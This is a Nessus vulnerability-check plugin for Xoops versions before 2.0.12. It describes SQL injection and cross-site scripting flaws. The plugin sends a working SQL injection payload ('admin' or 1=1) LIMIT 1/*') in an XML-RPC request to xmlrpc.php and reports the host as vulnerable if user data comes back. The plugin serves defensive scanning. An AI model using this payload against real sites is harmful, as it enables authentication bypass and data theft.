#
# (C) Tenable Network Security
#
# 

if (description) {
  script_id(18614);
  script_version("$Revision: 1.1 $");

  script_bugtraq_id(14094, 14096);

  name["english"] = "Xoops < 2.0.12 Multiple Vulnerabilities";
  script_name(english:name["english"]);
 
  desc["english"] = "
The version of Xoops installed on the remote host is prone to several
vulnerabilities :

  - A SQL Injection Vulnerability
    The bundled XMLRPC server fails to sanitize user-supplied 
    input to the 'xmlrpc.php' script. An attacker can exploit
    this flaw to launch SQL injection attacks which may lead to
    authentication bypass, disclosure of sensitive information,
    attacks against the underlying database, and the like.

  - Multiple Cross-Site Scripting Vulnerabilities
    An attacker can pass arbitrary HTML and script code through
    the 'order' and 'cid' parameters of the 
    'modules/newbb/edit.php' 'modules/repository/comment_edit.php'
    scripts respectively, which could result in disclosure of 
    administrative session cookies.

See also : http://www.gulftech.org/?node=research&article_id=00086-06292005
Solution : Upgrade to Xoops version 2.0.12 or later. 
Risk factor : High";
  script_description(english:desc["english"]);
 
  summary["english"] = "Checks for multiple vulnerabilities in Xoops < 2.0.12";
  script_summary(english:summary["english"]);
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005 Tenable Network Security");

  script_dependencie("xoops_detect.nasl");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/xoops"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches)) {
  dir = matches[2];

  # Check whether the script exists.
  req = http_get(item:string(dir, "/xmlrpc.php"), port:port);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # If it does...
  if ("<value>Method not supported" >< res) {
    # Try to exploit the SQL injection.
    postdata = string(
      '<?xml version="1.0"?>',
      "<methodCall>",
      "<methodName>blogger.getUserInfo</methodName>",
        "<params>",
          "<param><value><string></string></value></param>",
          "<param><value><string>admin' or 1=1) LIMIT 1/*</string></value></param>",
          "<param><value><string>", SCRIPT_NAME, "</string></value></param>",
          "<param><value><string></string></value></param>",
        "</params>",
      "</methodCall>"
    );
    req = string(
      "POST ", dir, "/xmlrpc.php HTTP/1.1\r\n",
      "Host: ", get_host_name(), "\r\n",
      "Content-Type: text/xml\r\n",
      "Content-Length: ", strlen(postdata), "\r\n",
      "\r\n",
      postdata
    );
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
    if (res == NULL) exit(0);

    # There's a problem if we get member info.
    if ("<struct><member><name>" >< res) {
      security_hole(port);
      exit(0);
    }
  }
}
